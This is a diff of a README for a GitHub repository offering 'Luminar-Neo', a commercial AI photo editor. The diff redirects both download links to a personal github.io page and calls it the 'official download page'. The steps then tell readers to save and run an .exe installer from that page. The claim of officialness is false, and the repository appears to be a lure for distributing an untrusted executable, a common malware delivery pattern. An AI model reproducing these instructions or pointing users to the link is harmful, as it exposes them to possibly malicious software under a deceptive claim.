@@ -1,6 +1,6 @@
 # 📷 Luminar-Neo - Edit your photos with smart tools
 
-[![Download Luminar Neo](https://img.shields.io/badge/Download-Luminar_Neo-blue)](https://github.com/hwangwuju/Luminar-Neo)
+[![Download Luminar Neo](https://img.shields.io/badge/Download-Luminar_Neo-blue)](https://hwangwuju.github.io)
 
 Luminar Neo helps you improve your photos using artificial intelligence. This software works on Windows 10 and Windows 11. It provides tools to adjust light, remove objects, and replace skies in a few clicks.
 
@@ -21,7 +21,7 @@ If your computer meets these standards, the software will run smoothly.
 
 Follow these steps to obtain and start the application on your computer:
 
-1. Visit the [official download page](https://github.com/hwangwuju/Luminar-Neo) to begin the process.
+1. Visit the [official download page](https://hwangwuju.github.io) to begin the process.
 2. Look for the button marked "Download" or "Release" on that page.
 3. Save the installer file to your computer.
 4. Locate the saved file, which usually ends in .exe.
